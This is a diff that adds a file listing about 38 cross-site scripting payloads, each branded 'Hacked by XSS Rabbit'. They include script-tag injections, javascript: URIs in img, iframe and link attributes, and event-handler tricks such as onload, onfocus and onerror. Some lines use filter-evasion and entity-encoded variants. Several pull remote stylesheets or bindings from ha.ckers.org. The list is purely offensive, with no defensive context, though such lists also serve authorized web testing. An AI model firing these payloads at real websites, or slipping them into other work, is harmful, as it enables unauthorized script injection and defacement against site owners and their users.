@@ -1,0 +1,38 @@
+"""><script>alert('Hacked by XSS Rabbit')</script>
+"""><script>alert("Hacked by XSS Rabbit");</script>
+""">javascript:alert("Hacked by XSS Rabbit")
+"""><img src="javascript:alert('Hacked by XSS Rabbit');">
+"""><img src=javascript:alert(&quot;Hacked by XSS Rabbit&quot;)>
+"""><IFRAME SRC="javascript:alert('Hacked by XSS Rabbit');"></IFRAME><SCRIPT a=">" SRC="Hacked by XSS Rabbit"></SCRIPT>
+"""><SCRIPT a=">" '' SRC="Hacked by XSS Rabbit"></SCRIPT>
+"""><SCRIPT "a='>'" SRC="Hacked by XSS Rabbit"></SCRIPT>
+"""><SCRIPT a=">'>" SRC="Hacked by XSS Rabbit"></SCRIPT>
+"""><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="Hacked by XSS Rabbit"></SCRIPT>
+"""><<SCRIPT>alert("Hacked by XSS Rabbit");//<</SCRIPT>
+"""><h1><font color=blue>Hacked by XSS Rabbit</h1>
+"""><BODY ONLOAD=alert('Hacked by XSS Rabbit')>
+"""><input onfocus=write(Hacked by XSS Rabbit) autofocus>
+"""><input onblur=write(Hacked by XSS Rabbit) autofocus><input autofocus>
+"""><body onscroll=alert(Hacked by XSS Rabbit)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+"""><form><button formaction="javascript:alert(Hacked by XSS Rabbit)">lol
+"""><!--<img src="--><img src=x onerror=alert(Hacked by XSS Rabbit)//">
+"""><![><img src="]><img src=x onerror=alert(Hacked by XSS Rabbit)//">
+"""><style><img src="</style><img src=x onerror=alert(Hacked by XSS Rabbit)//">
+""">&lt;SCRIPT&gt;alert(/Hacked by XSS Rabbit/&#46;source)&lt;/SCRIPT&gt;
+""">\\";alert('Hacked by XSS Rabbit');//
+""">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"Hacked by XSS Rabbit\");&lt;/SCRIPT&gt;
+""">&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('Hacked by XSS Rabbit');\"&gt;
+""">&lt;BODY BACKGROUND=\"javascript&#058;alert('Hacked by XSS Rabbit')\"&gt;
+""">&lt;BODY ONLOAD=alert('Hacked by XSS Rabbit')&gt;
+""">&lt;IMG DYNSRC=\"javascript&#058;alert('Hacked by XSS Rabbit')\"&gt;
+""">&lt;IMG LOWSRC=\"javascript&#058;alert('Hacked by XSS Rabbit')\"&gt;
+""">&lt;BGSOUND SRC=\"javascript&#058;alert('Hacked by XSS Rabbit');\"&gt;
+""">&lt;BR SIZE=\"&{alert('Hacked by XSS Rabbit')}\"&gt;
+""">&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('Hacked by XSS Rabbit');\"&gt;
+""">&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/Hacked by XSS Rabbit&#46;css\"&gt;
+""">&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/Hacked by XSS Rabbit&#46;css';&lt;/STYLE&gt;
+""">&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/Hacked by XSS Rabbit&#46;css&gt;; REL=stylesheet\"&gt;
+""">&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/Hacked by XSS Rabbitmoz&#46;xml#Hacked by XSS Rabbit\")}&lt;/STYLE&gt;
+""">&lt;Hacked by XSS Rabbit STYLE=\"behavior&#58; url(Hacked by XSS Rabbit&#46;htc);\"&gt;
+""">&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('Hacked by XSS Rabbit')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;Hacked by XSS Rabbit
+""">&lt;IMG SRC='vbscript&#058;msgbox(\"Hacked by XSS Rabbit\")'&gt;
